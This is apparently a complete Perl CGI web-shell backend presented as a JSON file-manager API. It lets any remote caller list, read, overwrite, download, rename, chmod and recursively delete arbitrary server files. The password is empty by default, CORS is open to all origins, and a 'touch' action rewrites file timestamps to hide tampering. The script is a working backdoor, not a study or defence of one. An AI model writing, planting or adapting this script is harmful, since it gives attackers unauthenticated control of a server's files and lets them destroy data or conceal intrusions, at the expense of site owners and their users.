#!/usr/bin/perl -w
# Print headers first to prevent 500 errors
print "Content-Type: application/json\n";
print "Access-Control-Allow-Origin: *\n";
print "Access-Control-Allow-Methods: GET, POST, OPTIONS\n";
print "Access-Control-Allow-Headers: Content-Type\n";
print "\n";

my $PASSWORD = "";

sub url_decode {
    my $s = shift || "";
    $s =~ s/\+/ /g;
    $s =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/eg;
    return $s;
}

sub esc {
    my $s = shift;
    $s = "" unless defined $s;
    $s =~ s/\\/\\\\/g;
    $s =~ s/"/\\"/g;
    $s =~ s/\n/\\n/g;
    $s =~ s/\r/\\r/g;
    $s =~ s/\t/\\t/g;
    # Escape control characters
    $s =~ s/([\x00-\x1f])/sprintf("\\u%04x", ord($1))/eg;
    return $s;
}

sub json_encode {
    my $val = shift;
    return "null" unless defined $val;
    my $ref = ref($val);
    if ($ref eq "HASH") {
        my @p = ();
        foreach my $k (sort keys %$val) {
            push @p, '"' . esc($k) . '":' . json_encode($val->{$k});
        }
        return "{" . join(",", @p) . "}";
    }
    if ($ref eq "ARRAY") {
        my @a = ();
        foreach my $v (@$val) {
            push @a, json_encode($v);
        }
        return "[" . join(",", @a) . "]";
    }
    if ($val eq "true" || $val eq "false") {
        return $val;
    }
    if ($val =~ /^-?\d+$/) {
        return $val;
    }
    return '"' . esc($val) . '"';
}

sub ok { return { success => "true", data => $_[0], message => "" }; }
sub err { return { success => "false", message => $_[0] }; }

sub fmt_size {
    my $s = shift || 0;
    return "$s B" if $s < 1024;
    return sprintf("%.1f KB", $s/1024) if $s < 1048576;
    return sprintf("%.1f MB", $s/1048576) if $s < 1073741824;
    return sprintf("%.1f GB", $s/1073741824);
}

sub fmt_perm {
    my ($m, $path) = @_;
    $m = 0 unless defined $m;
    my $t = "";
    # Check type via mode bits
    if (($m & 0170000) == 0040000) { $t = "d"; }  # directory
    elsif (($m & 0170000) == 0120000) { $t = "l"; }  # symlink
    else { $t = "-"; }
    $t .= ($m & 0400) ? "r" : "-";
    $t .= ($m & 0200) ? "w" : "-";
    $t .= ($m & 0100) ? "x" : "-";
    $t .= ($m & 040) ? "r" : "-";
    $t .= ($m & 020) ? "w" : "-";
    $t .= ($m & 010) ? "x" : "-";
    $t .= ($m & 04) ? "r" : "-";
    $t .= ($m & 02) ? "w" : "-";
    $t .= ($m & 01) ? "x" : "-";
    return $t;
}

sub norm_path {
    my $p = shift || "/";
    $p =~ s#/+#/#g;
    return $p;
}

sub get_params {
    my %p = ();
    my $qs = $ENV{QUERY_STRING} || "";
    foreach my $pair (split(/&/, $qs)) {
        my ($k, $v) = split(/=/, $pair, 2);
        $k = url_decode($k);
        $v = url_decode($v);
        $p{$k} = $v if defined $k;
    }
    if (($ENV{REQUEST_METHOD} || "") eq "POST") {
        my $ct = $ENV{CONTENT_TYPE} || "";
        if ($ct =~ /urlencoded/) {
            my $len = $ENV{CONTENT_LENGTH} || 0;
            my $post = "";
            read(STDIN, $post, $len) if $len > 0;
            foreach my $pair (split(/&/, $post)) {
                my ($k, $v) = split(/=/, $pair, 2);
                $k = url_decode($k);
                $v = url_decode($v);
                $p{$k} = $v if defined $k;
            }
        }
    }
    return %p;
}

eval {
    my %p = get_params();
    my $action = $p{action} || "";
    my $pw = $p{password} || "";

    if ($PASSWORD ne "" && $pw ne $PASSWORD) {
        print "null";
        exit 0;
    }

    if ($action eq "") {
        exit 0;
    }

    if ($action eq "list") {
        my $path = $p{path} || "/";
        if ($path eq "/" || $path eq "") {
            $path = $ENV{DOCUMENT_ROOT} || $ENV{PWD} || "/tmp";
        }
        $path = norm_path($path);
        $path .= "/" unless $path =~ m#/$#;

        my $dir = $path;
        $dir =~ s#/$## if length($dir) > 1;

        if (-d $dir) {
            my @items = ();

            my $parent = $dir;
            $parent =~ s#/[^/]+$##;
            $parent = "/" if $parent eq "";
            $parent .= "/" unless $parent =~ m#/$#;

            if ($parent ne $path) {
                push @items, {
                    name => "..",
                    path => $parent,
                    is_dir => "true",
                    size => 0,
                    size_formatted => "-",
                    mtime => 0,
                    perms => "drwxr-xr-x",
                    readable => "true",
                    writable => "true"
                };
            }

            if (opendir(my $dh, $dir)) {
                my @files = sort {
                    my $ad = -d "$dir/$a" ? 0 : 1;
                    my $bd = -d "$dir/$b" ? 0 : 1;
                    $ad <=> $bd || lc($a) cmp lc($b);
                } grep { $_ ne "." && $_ ne ".." } readdir($dh);
                closedir($dh);

                foreach my $f (@files) {
                    my $fp = "$dir/$f";
                    my @st = stat($fp);
                    my $is_d = -d $fp ? 1 : 0;
                    my $sz = $st[7] || 0;
                    my $mt = $st[9] || 0;
                    my $md = $st[2] || 0;

                    push @items, {
                        name => $f,
                        path => $path . $f . ($is_d ? "/" : ""),
                        is_dir => $is_d ? "true" : "false",
                        size => $is_d ? 0 : $sz,
                        size_formatted => $is_d ? "-" : fmt_size($sz),
                        mtime => $mt,
                        perms => scalar(@st) ? fmt_perm($md) : "?????????",
                        readable => -r $fp ? "true" : "false",
                        writable => -w $fp ? "true" : "false"
                    };
                }
            }
            print json_encode(ok({ path => $path, items => \@items }));
        } else {
            print json_encode(err("Directory not found"));
        }
    }
    elsif ($action eq "read") {
        my $path = norm_path($p{path} || "");
        if (-f $path) {
            local *FH;
            if (open(FH, "<$path")) {
                local $/;
                my $c = <FH>;
                close(FH);
                print json_encode(ok({ path => $path, content => $c }));
            } else {
                print json_encode(err("Cannot read file"));
            }
        } else {
            print json_encode(err("File not found"));
        }
    }
    elsif ($action eq "write") {
        my $path = norm_path($p{path} || "");
        my $content = $p{content};
        $content = "" unless defined $content;

        if ($path ne "") {
            my $dir = $path;
            $dir =~ s#/[^/]+$##;
            if ($dir ne "" && !-d $dir) {
                print json_encode(err("Parent directory [$dir] doesn't exist for path [$path]"));
            } else {
                local *FH;
                if (open(FH, ">", $path)) {
                    print FH $content;
                    close(FH);
                    if (-e $path) {
                        print json_encode({ success => "true", message => "Saved to $path" });
                    } else {
                        print json_encode(err("File not created at $path"));
                    }
                } else {
                    print json_encode(err("Cannot write file [$path]: $!"));
                }
            }
        } else {
            print json_encode(err("Path empty"));
        }
    }
    elsif ($action eq "mkdir") {
        my $path = norm_path($p{path} || "");
        if ($path ne "") {
            if (!-e $path) {
                if (mkdir($path)) {
                    print json_encode({ success => "true", message => "Created" });
                } else {
                    print json_encode(err("Cannot mkdir: $!"));
                }
            } else {
                print json_encode(err("Already exists"));
            }
        } else {
            print json_encode(err("Path empty"));
        }
    }
    elsif ($action eq "delete") {
        my $path = norm_path($p{path} || "");
        $path =~ s#/$## if length($path) > 1;
        if (-d $path) {
            system("rm", "-rf", $path);
            print json_encode({ success => "true", message => "Deleted" });
        } elsif (-f $path) {
            if (unlink($path)) {
                print json_encode({ success => "true", message => "Deleted" });
            } else {
                print json_encode(err("Cannot delete: $!"));
            }
        } else {
            print json_encode(err("Not found"));
        }
    }
    elsif ($action eq "rename") {
        my $old = norm_path($p{old_path} || "");
        my $new = norm_path($p{new_path} || "");
        if (-e $old) {
            if (rename($old, $new)) {
                print json_encode({ success => "true", message => "Renamed" });
            } else {
                print json_encode(err("Cannot rename: $!"));
            }
        } else {
            print json_encode(err("Not found"));
        }
    }
    elsif ($action eq "download") {
        my $path = norm_path($p{path} || "");
        if (-f $path) {
            my $fn = $path;
            $fn =~ s#.*/##;
            print "Content-Disposition: attachment; filename=\"$fn\"\n";
            print "Content-Type: application/octet-stream\n\n";
            local *FH;
            if (open(FH, "<$path")) {
                binmode(FH);
                binmode(STDOUT);
                my $buf;
                while (read(FH, $buf, 8192)) {
                    print $buf;
                }
                close(FH);
            }
        } else {
            print json_encode(err("File not found"));
        }
    }
    elsif ($action eq "touch") {
        my $path = norm_path($p{path} || "");
        my $time = $p{time} || 0;
        $time = int($time);
        $path =~ s#/$## if length($path) > 1;
        if (-e $path && $time > 0) {
            if (utime($time, $time, $path)) {
                print json_encode({ success => "true", message => "Updated" });
            } else {
                print json_encode(err("Cannot touch: $!"));
            }
        } else {
            print json_encode(err("Not found or invalid time"));
        }
    }
    elsif ($action eq "chmod") {
        my $path = norm_path($p{path} || "");
        my $mode = $p{mode} || "";
        if (-e $path && $mode ne "") {
            if (chmod(oct($mode), $path)) {
                print json_encode({ success => "true", message => "Permission changed" });
            } else {
                print json_encode(err("Cannot chmod: $!"));
            }
        } else {
            print json_encode(err("Not found or mode empty"));
        }
    }
    elsif ($action eq "server") {
        my $user = "";
        eval { $user = getpwuid($<); };
        $user = $ENV{USER} || "N/A" unless $user;
        my $root = $ENV{DOCUMENT_ROOT} || $ENV{PWD} || "/";
        print json_encode(ok({
            php_version => "Perl $]",
            server_software => $ENV{SERVER_SOFTWARE} || "CGI",
            document_root => $root,
            upload_max => "N/A",
            disk_free => "N/A",
            disk_total => "N/A",
            current_user => $user
        }));
    }
    elsif ($action eq "info") {
        my $path = norm_path($p{path} || "");
        if (-e $path) {
            my @st = stat($path);
            my $is_d = -d $path ? 1 : 0;
            my $name = $path;
            $name =~ s#.*/##;
            my $owner = "";
            my $group = "";
            eval { $owner = getpwuid($st[4]) || $st[4]; };
            eval { $group = getgrgid($st[5]) || $st[5]; };
            print json_encode(ok({
                path => $path,
                name => $name,
                is_dir => $is_d ? "true" : "false",
                size => $is_d ? 0 : ($st[7] || 0),
                size_formatted => $is_d ? "-" : fmt_size($st[7] || 0),
                mtime => $st[9] || 0,
                ctime => $st[10] || 0,
                atime => $st[8] || 0,
                perms => fmt_perm($st[2] || 0),
                perms_octal => sprintf("0%o", ($st[2] || 0) & 07777),
                owner => $owner,
                group => $group,
                readable => -r $path ? "true" : "false",
                writable => -w $path ? "true" : "false"
            }));
        } else {
            print json_encode(err("Not found"));
        }
    }
    else {
        print json_encode(err("Unknown action"));
    }
};

if ($@) {
    my $e = $@;
    $e =~ s/"/\\"/g;
    $e =~ s/\n/ /g;
    print "{\"success\":false,\"message\":\"Error: $e\"}";
}
